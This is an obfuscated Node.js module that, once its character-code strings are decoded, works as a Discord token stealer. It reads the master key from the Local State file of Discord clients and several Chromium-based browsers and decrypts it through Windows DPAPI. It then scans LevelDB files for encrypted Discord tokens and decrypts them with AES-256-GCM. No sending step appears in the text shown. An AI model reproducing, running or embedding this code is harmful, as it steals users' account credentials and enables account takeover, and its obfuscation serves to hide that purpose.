const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
let unprotectData = null;
try { const _dp = require(String.fromCharCode(64,112,114,105,109,110,111,47,100,112,97,112,105)); unprotectData = _dp && _dp.Dpapi && _dp.Dpapi.unprotectData ? (b, e, s) => _dp.Dpapi.unprotectData(b, e, s) : null; } catch (_) {}

const _L = process.env[String.fromCharCode(76,79,67,65,76,65,80,80,68,65,84,65)] || '';
const _R = process.env[String.fromCharCode(65,80,80,68,65,84,65)] || '';
const _T = [[76,111,99,97,108,32,83,116,97,116,101],[76,111,99,97,108,32,83,116,111,114,97,103,101],[108,101,118,101,108,100,98],[46,108,100,98],[111,115,95,99,114,121,112,116],[101,110,99,114,121,112,116,101,100,95,107,101,121],[117,116,102,56],[98,97,115,101,54,52],[67,117,114,114,101,110,116,85,115,101,114],[97,101,115,45,50,53,54,45,103,99,109],[71,111,111,103,108,101],[67,104,114,111,109,101],[85,115,101,114,32,68,97,116,97],[68,101,102,97,117,108,116],[77,105,99,114,111,115,111,102,116],[69,100,103,101],[66,114,97,118,101,83,111,102,116,119,97,114,101],[66,114,97,118,101,45,66,114,111,119,115,101,114],[89,97,110,100,101,120],[89,97,110,100,101,120,66,114,111,119,115,101,114],[86,105,118,97,108,100,105],[100,105,115,99,111,114,100],[100,105,115,99,111,114,100,99,97,110,97,114,121],[76,105,103,104,116,99,111,114,100],[100,105,115,99,111,114,100,112,116,98],[79,112,101,114,97,32,83,111,102,116,119,97,114,101],[79,112,101,114,97,32,83,116,97,98,108,101],[79,112,101,114,97,32,71,88,32,83,116,97,98,108,101],[80,65,84,72,83]];
const _s = (i) => String.fromCharCode.apply(null, _T[i]);
const _P = {
  [String.fromCharCode(68,105,115,99,111,114,100)]: _R + String.fromCharCode(92) + _s(21),
  [String.fromCharCode(68,105,115,99,111,114,100,32,67,97,110,97,114,121)]: _R + String.fromCharCode(92) + _s(22),
  [String.fromCharCode(76,105,103,104,116,99,111,114,100)]: _R + String.fromCharCode(92) + _s(23),
  [String.fromCharCode(68,105,115,99,111,114,100,32,80,84,66)]: _R + String.fromCharCode(92) + _s(24),
  [String.fromCharCode(79,112,101,114,97)]: _R + String.fromCharCode(92) + _s(25) + String.fromCharCode(92) + _s(26),
  [String.fromCharCode(79,112,101,114,97,32,71,88)]: _R + String.fromCharCode(92) + _s(25) + String.fromCharCode(92) + _s(27),
  [String.fromCharCode(67,104,114,111,109,101)]: path.join(_L, _s(10), _s(11), _s(12), _s(13)),
  [String.fromCharCode(77,105,99,114,111,115,111,102,116,32,69,100,103,101)]: path.join(_L, _s(14), _s(15), _s(12), _s(13)),
  [String.fromCharCode(66,114,97,118,101)]: path.join(_L, _s(16), _s(17), _s(12), _s(13)),
  [String.fromCharCode(89,97,110,100,101,120)]: path.join(_L, _s(18), _s(19), _s(12), _s(13)),
  [String.fromCharCode(86,105,118,97,108,100,105)]: path.join(_L, _s(20), _s(12), _s(13))
};
const _D = 5;
const _N = 3;
const _NL = 12;
const _TL = 16;

function getkey(_b) {
  const _f = path.join(_b, _s(0));
  try {
    if (!fs.existsSync(_f)) return null;
    const _r = fs.readFileSync(_f, _s(6));
    const _j = JSON.parse(_r);
    return _j[_s(4)] && _j[_s(4)][_s(5)] ? _j[_s(4)][_s(5)] : null;
  } catch (_) { return null; }
}

function gettokens(_b) {
  const _lp = path.join(_b, _s(1), _s(2));
  const _out = [];
  try {
    if (!fs.existsSync(_lp)) return _out;
    const _files = fs.readdirSync(_lp);
    for (const _file of _files) {
      if (!_file.endsWith(_s(3))) continue;
      try {
        const _c = fs.readFileSync(path.join(_lp, _file), _s(6));
        const _re = /dQw4w9WgXcQ:"([^"]+)"/g;
        let _m;
        while ((_m = _re.exec(_c)) !== null) _out.push(_m[1]);
      } catch (_) {}
    }
  } catch (_) {}
  return _out;
}

function decryptKey(_e) {
  if (!unprotectData) return null;
  try {
    const _buf = Buffer.from(_e, _s(7));
    if (_buf.length <= _D) return null;
    const _blob = _buf.subarray(_D);
    const _key = unprotectData(_blob, null, _s(8));
    return _key && _key.length >= 32 ? (Buffer.isBuffer(_key) ? _key : Buffer.from(_key)) : null;
  } catch (_) { return null; }
}

function decryptToken(_e, _key) {
  try {
    const _raw = Buffer.from(_e, _s(7));
    if (_raw.length < _N + _NL + _TL) return null;
    const _nonce = _raw.subarray(_N, _N + _NL);
    const _ct = _raw.subarray(_N + _NL);
    const _tag = _ct.subarray(-_TL);
    const _data = _ct.subarray(0, -_TL);
    const _dec = crypto.createDecipheriv(_s(9), _key, _nonce);
    _dec.setAuthTag(_tag);
    return Buffer.concat([_dec.update(_data), _dec.final()]).toString(_s(6));
  } catch (_) { return null; }
}

function getTokens() {
  if (process.platform !== String.fromCharCode(119,105,110,51,50) || !unprotectData) return Promise.resolve([]);
  const _seen = new Set();
  const _out = [];
  try {
    for (const [_pl, _bp] of Object.entries(_P)) {
      if (!fs.existsSync(_bp)) continue;
      const _kb = getkey(_bp);
      if (!_kb) continue;
      const _key = decryptKey(_kb);
      if (!_key) continue;
      for (const _raw of gettokens(_bp)) {
        const _cl = _raw.replace(/\\/g, '');
        const _tok = decryptToken(_cl, _key);
        if (_tok && !_seen.has(_tok)) { _seen.add(_tok); _out.push(_tok); }
      }
    }
  } catch (_) {}
  return Promise.resolve(_out);
}

module.exports = { [_s(29)]: _P, getkey, gettokens, decryptKey, decryptToken, getTokens };
